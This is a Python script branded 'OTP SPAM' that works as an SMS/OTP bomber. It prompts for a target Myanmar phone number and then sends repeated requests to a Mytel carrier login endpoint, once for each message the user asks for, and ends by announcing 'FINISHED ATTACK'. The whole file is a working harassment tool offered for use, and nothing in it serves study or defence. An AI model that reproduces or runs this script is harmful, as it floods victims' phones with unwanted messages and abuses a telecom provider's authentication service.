import requests
import os
import colorama
from colorama import Fore,Back,Style
import time

class dev():
    def __init__(self,telegram,Team,developer):
        self.telegram = telegram
        self.Team = Team
        self.developer = developer

dp = dev('@Ace_TM0','Myanmar Cyber Security','ACE') 

banner = (Fore.BLUE + '''


 ▒█████  ▄▄▄█████▓ ██▓███       ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▒██▒  ██▒▓  ██▒ ▓▒▓██░  ██▒   ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒██░  ██▒▒ ▓██░ ▒░▓██░ ██▓▒   ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒██   ██░░ ▓██▓ ░ ▒██▄█▓▒ ▒     ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ 
░ ████▓▒░  ▒██▒ ░ ▒██▒ ░  ░   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░ ▒░▒░▒░   ▒ ░░   ▒▓▒░ ░  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
  ░ ▒ ▒░     ░    ░▒ ░        ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
░ ░ ░ ▒    ░      ░░          ░  ░  ░  ░░         ░   ▒   ░      ░   
    ░ ░                             ░                 ░  ░       ░   
                                                                     
''')

def ins():
    if os.path.exists('python3') and os.path.exists('requests') and os.path.exists('pip'):
        print(Fore.RED + 'python - DONE')
        print(Fore.RED + 'pip - DONE')
        print(Fore.RED + 'requests - DONE')
        pass
    else:
        os.system('pkg install python3')
        os.system('pip --version')
        os.system('pip install python-requests')
        os.system('pip install colorama')
        print('DONE')



def developer():
    print(banner)
    print(f'''Developer      -{dp.telegram}
Orgnization   -{dp.Team}
Developer      -{dp.developer}
           ''')
    

    

def main():
    while True:
        phone = input(Fore.GREEN +'Enter Target Phone Number(without +95): ')
        if len(phone) == 11:
            print(Fore.BLUE + f'Target : {phone}')
        if len(phone) != 11 or len(phone) > 11:
            print(Fore.RED + 'Total count is 11')
            if phone not in '09':
                print(Fore.RED + f'YOU need 09')
        else:
            a = requests.get(f'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}',timeout=2)
            s = a.status_code
            print(f'Checking phone - {phone}')
            time.sleep(2)
            print(f'Check status_code : {s==200}')
            time.sleep(2)
            print(f'Check network : {s==200}')
            time.sleep(2)
            print('Checking..............................')
            time.sleep(4)
            
            if s == 200:
                print(f'Valid - {phone}')
                count = int(input('Enter Count of OTP :'))
                for i in range(1,count):
                    m = requests.get(f'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}',timeout=4)
                    ss = m.status_code
                    if ss == 200:
                        print(Fore.GREEN + f'OTP',i,'DONE')
                        
                    else:
                        print("ERROR")

                print(Fore.RED + 'FINISHED ATTACK')            

            else:
                print(f'Invalid - {phone}')            
                         

def lee():
    ins()
    developer()
    main()                  
                
lee()                

      
    
